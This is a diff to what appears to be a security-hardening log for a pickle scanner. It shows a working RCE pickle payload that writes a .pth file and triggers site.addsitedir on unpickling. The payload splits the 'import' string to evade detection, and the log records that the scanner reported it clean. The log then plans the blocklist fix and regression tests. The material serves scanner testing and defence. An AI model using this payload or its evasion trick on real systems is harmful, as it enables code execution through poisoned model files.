@@ -1984,3 +1984,115 @@ Blocking plan:
 Performance note: the fix adds one tuple to a sorted static table checked with
 binary search. It does not add callback-flow tracking, context object state
 modeling, or descriptor-specific execution simulation.
+
+## Turn 47 - `site.addsitedir` `.pth` execution gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using stdlib site-directory
+processing rather than an obvious process-spawn or callback API.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_site_addsitedir_marker")
+pth = Path("/tmp/ma_site_addsitedir_exec.pth")
+content_parts = [
+    "im",
+    "port pathlib; pathlib.Path(",
+    repr(str(marker)),
+    ").touch()\n",
+]
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("pathlib", "PosixPath"),
+        b"(",
+        s("/"),
+        s("tmp"),
+        s("ma_site_addsitedir_exec.pth"),
+        b"tR\x940",
+        sg("builtins", "str.join"),
+        b"(",
+        s(""),
+        b"(",
+        *(s(part) for part in content_parts),
+        b"ttR\x940",
+        sg("pathlib", "Path.write_text"),
+        b"(h\x00h\x01tR0",
+        sg("site", "addsitedir"),
+        s("/tmp"),
+        b"\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=237`, `bytes_total=237`, `opcode_count=43`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `pathlib.PosixPath`, `builtins.str.join`,
+  `pathlib.Path.write_text`, and `site.addsitedir`, all with
+  `is_dangerous=False`
+- Control proof: the same pickle without the final `site.addsitedir("/tmp")`
+  call writes `/tmp/ma_site_addsitedir_exec.pth` but does not create
+  `/tmp/ma_site_addsitedir_marker`
+- Unpickle result: the full payload writes the `.pth` file, calls
+  `site.addsitedir("/tmp")`, creates `/tmp/ma_site_addsitedir_marker`, and
+  returns `None`
+- RCE mechanism: the pickle writes a `.pth` file containing
+  `import pathlib; pathlib.Path('/tmp/ma_site_addsitedir_marker').touch()`.
+  `site.addsitedir()` processes `.pth` files in that directory and executes
+  lines beginning with `import`, so attacker-controlled Python code runs during
+  deserialization.
+
+Why the scanner missed it:
+
+- `site.addsitedir` is absent from `DANGEROUS_GLOBALS`; only `site.main` is
+  currently listed.
+- The payload uses only currently clean globals: `pathlib.PosixPath`,
+  `builtins.str.join`, `pathlib.Path.write_text`, and `site.addsitedir`.
+- The required `.pth` executable line is assembled from `"im"` and
+  `"port pathlib; ..."` fragments at unpickle time. No single pickle string
+  literal contains an `import` statement, so the suspicious-string heuristic
+  does not fire.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is a file-mediated Python execution sink. The focused
+next block should add sorted `DANGEROUS_GLOBALS` entries for
+`("site", "addsitedir")` and the lower-level `.pth` processor
+`("site", "addpackage")`, plus a manual-pickle oracle regression for the
+fragmented-import `.pth` proof. The hot path remains static policy lookup.
+
+## Turn 48 - Block `site.addsitedir` `.pth` execution
+
+Blocking plan:
+
+- Add `("site", "addsitedir")` and `("site", "addpackage")` to the sorted
+  Rust `DANGEROUS_GLOBALS` table. `addsitedir` is the public site-directory
+  processor and `addpackage` is the lower-level `.pth` processor that executes
+  import-prefixed lines.
+- Add portable policy coverage for raw reductions of both site functions so
+  detection does not depend on the fragmented `.pth` oracle shape.
+- Add a CPython oracle regression that first proves the fragmented
+  `Path.write_text()` payload only writes the `.pth` file, then proves adding
+  `site.addsitedir(tmp_path)` executes that `.pth` file and creates the marker
+  during `pickle.loads()`.
+
+Performance note: the fix adds two tuples to a sorted static table checked
+with binary search. It does not add filesystem simulation, `.pth` parsing, or
+cross-literal string reconstruction for fragmented import statements.
